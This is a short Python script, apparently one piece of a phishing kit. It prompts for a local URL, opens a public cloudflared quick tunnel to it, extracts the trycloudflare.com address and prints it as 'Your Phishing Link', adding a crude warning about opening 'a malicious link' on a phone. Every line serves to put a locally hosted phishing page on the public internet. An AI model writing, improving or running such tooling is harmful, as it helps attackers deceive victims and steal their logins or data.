import subprocess
import re

# Prompt the user
user_url = input("Please copy the http://10.000.000.000:4040 from the script you just used and paste it here: ").strip()

# Validate input
if not user_url.startswith("http://"):
    print("Invalid URL. Please enter a valid one.")
    exit(1)

# Run the cloudflared command with HTTP/2 protocol
cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", user_url]

try:
    # Start cloudflared process
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    tunnel_url = None

    # Read output in real-time
    for line in process.stdout:
        # Search for the Cloudflare tunnel URL
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"""\nYour Phishing Link:\n{tunnel_url}\n\nOpen using Chrome, Firefox, or Safari, NOT BY YOUR PHONE IDIOT IF YOU CREATED A MALICIOUS LINK!\n""")
            break  # Stop processing further output once the URL is found

    # Keep the tunnel running
    process.wait()

except KeyboardInterrupt:
    process.terminate()

except Exception as e:
    print(f"[ERROR] {e}")

